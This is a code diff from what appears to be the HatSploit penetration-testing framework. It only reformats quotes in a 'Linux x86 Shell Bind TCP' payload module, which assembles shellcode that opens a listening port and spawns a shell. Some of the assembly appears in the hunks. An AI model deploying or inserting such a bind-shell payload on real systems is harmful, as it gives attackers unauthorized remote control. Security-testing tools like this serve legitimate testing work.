@@ -10,21 +10,21 @@ from pex.socket import Socket
 
 class HatSploitPayload(Payload, Assembler, Socket):
     details = {
-        "Name": "Linux x86 Shell Bind TCP",
-        "Payload": "linux/x86/shell_bind_tcp",
-        "Authors": ["Ivan Nikolsky (enty8080) - payload developer"],
-        "Description": "Shell bind TCP payload for Linux x86.",
-        "Architecture": "x86",
-        "Platform": "linux",
-        "Rank": "high",
-        "Type": "bind_tcp",
+        'Name': "Linux x86 Shell Bind TCP",
+        'Payload': "linux/x86/shell_bind_tcp",
+        'Authors': ['Ivan Nikolsky (enty8080) - payload developer'],
+        'Description': "Shell bind TCP payload for Linux x86.",
+        'Architecture': "x86",
+        'Platform': "linux",
+        'Rank': "high",
+        'Type': "bind_tcp",
     }
 
     def run(self):
-        bport = self.pack_port(self.handler["BPORT"])
+        bport = self.pack_port(self.handler['BPORT'])
 
         return self.assemble(
-            self.details["Architecture"],
+            self.details['Architecture'],
             f"""
             start:
                 xor ebx, ebx
@@ -76,5 +76,5 @@ class HatSploitPayload(Payload, Assembler, Socket):
                 mov ecx, esp
                 mov al, 0xb
                 int 0x80
-            """,
+            """
         )
